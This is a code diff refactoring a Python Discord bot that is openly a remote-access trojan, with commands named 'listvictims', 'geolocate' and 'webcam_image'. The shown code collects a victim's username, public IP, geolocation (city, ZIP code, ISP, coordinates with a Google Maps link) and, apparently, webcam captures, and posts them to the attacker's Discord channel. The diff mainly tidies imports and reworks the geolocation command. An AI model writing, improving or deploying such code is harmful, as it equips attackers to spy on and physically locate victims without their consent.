@@ -6,13 +6,13 @@ from disnake import Webhook
 from disnake.ext import commands
 
 from mss import mss
-from requests import get, post
-from base64 import decodebytes,b64decode
-from socket import create_connection
 from datetime import datetime
-import os, subprocess, re, time, aiohttp
+from socket import create_connection
+from base64 import decodebytes, b64decode
+import os, subprocess, re, time, aiohttp, requests
 
-client, original_dir = commands.InteractionBot(test_guilds=server_ids), os.getcwd()
+original_dir = os.getcwd()
+client = commands.InteractionBot(test_guilds=server_ids)
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 @client.event
@@ -33,12 +33,11 @@ async def on_ready():
     await client.get_channel(notification_channel).send(embed=embed)
 
 # Intelligence Gathering #
-@client.slash_command(
-    name="listvictims",
-    description="Finds the values of environment variables"
-)
+@client.slash_command(name="listvictims", description="Finds the values of environment variables" )
 async def command(ctx):
-    await ctx.channel.send( embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") )
+    await ctx.channel.send( 
+        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") 
+    )
     await ctx.response.send_message("Checking all available victims...")
 
 @client.slash_command(
@@ -72,25 +71,35 @@ async def command(ctx, victim: str, environment: str):
             )
         )
 
-@client.slash_command(description="Finds all geolocation information of victim")
-async def geolocate(ctx, victim):
+@client.slash_command(
+    name="geolocate",
+    description="Finds all geolocation information of victim",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def command(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
-        data = get("http://ip-api.com/json/").json()
+        
+        data = requests.get("http://ip-api.com/json/").json()
+        if data["status"] != "success": 
+            return await ctx.send("```Unable to get Geolocation Info!```")
+            
         embed = discord.Embed(
-            title="Geolocation Information\n(Powered by ip-api)", color=0x0081FA
+            title="Geolocation Information\n(Powered by ip-api)", 
+            description=f"[Google Maps link](https://www.google.com/maps/search/google+map++{data['lat']},{data['lon']})",
+            timestamp=datetime.now()
         )
-        if data["status"] == "fail": return await ctx.send("```Unable to get Geolocation Info!```")
-        embed.add_field(name="Country name", value=f"{data['country']} ({data['countryCode']})", inline=True)
-        embed.add_field(name="City", value=data["city"], inline=True)
-        embed.add_field(name="Region", value=data["regionName"], inline=True)
-        embed.add_field(name="Latitude", value=data["lat"], inline=True)
-        embed.add_field(name="Longitude", value=data["lon"], inline=True)
-        embed.add_field(name="Zip code", value=data["zip"], inline=True)
-        embed.add_field(name="ISP", value=data["isp"], inline=True)
-        embed.set_footer(text="Written by NullCode1337")
+            
+        embed.add_field( name="Country", value=f"{data['country']} ({data['countryCode']})" )
+        embed.add_field( name="City",    value=data["city"]       )
+        embed.add_field( name="Region",  value=data["regionName"] )
+        embed.add_field( name="Zip code", value=data["zip"]       )
+        embed.add_field( name="ISP",      value=data["isp"]       )
+        embed.add_field( name="Timezone", value=data["timezone"]  )
+        
         await ctx.followup.send(embed=embed)
-    # else: await ctx.response.send_message("aaa")
 
 @client.slash_command(description="Capture image from webcam")  
 async def webcam_image(ctx, victim):
@@ -426,7 +435,7 @@ class closeall_confirm(discord.ui.View):
         
 # Required Functions
 def IP():
-    try: return get("http://icanhazip.com/").text.rstrip()
+    try: return requests.get("http://icanhazip.com/").text.rstrip()
     except: return "127.0.0.1"
 
 def is_connected():
